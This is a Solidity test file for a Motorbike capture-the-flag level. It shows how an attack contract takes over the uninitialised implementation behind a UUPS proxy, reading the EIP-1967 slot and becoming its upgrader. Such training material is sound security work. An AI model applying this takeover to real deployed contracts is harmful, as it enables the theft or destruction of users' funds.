// SPDX-License-Identifier: MIT
pragma solidity 0.8.37;

import {LuxTest} from "../Base.t.sol";
import {MotorbikeFactory} from "../../src/levels/MotorbikeFactory.sol";
import {Engine} from "../../src/levels/Motorbike.sol";
import {MotorbikeAttack} from "../../src/attacks/MotorbikeAttack.sol";

/// @dev The engine implementation behind the Motorbike proxy is never
/// initialised in its own context, so anyone can call `initialize()` on it and
/// become its upgrader. Seizing it wins the level.
contract MotorbikeLevel is LuxTest {
    // eip1967.proxy.implementation
    bytes32 constant IMPL_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    MotorbikeFactory factory;
    address player = makeAddr("player");

    function setUp() public {
        _deployCore();
        factory = new MotorbikeFactory();
        _register(factory);
    }

    function test_solve() public {
        address instance = _create(factory, player, 0);
        _assertUnsolved(instance, player);

        address engine = address(uint160(uint256(vm.load(instance, IMPL_SLOT))));
        assertEq(Engine(engine).upgrader(), address(0), "a fresh engine is already seized");

        MotorbikeAttack attack = new MotorbikeAttack(engine);
        attack.takeControl();
        assertEq(Engine(engine).upgrader(), address(attack), "did not seize the engine");

        _assertSolved(factory, instance, player);
    }
}
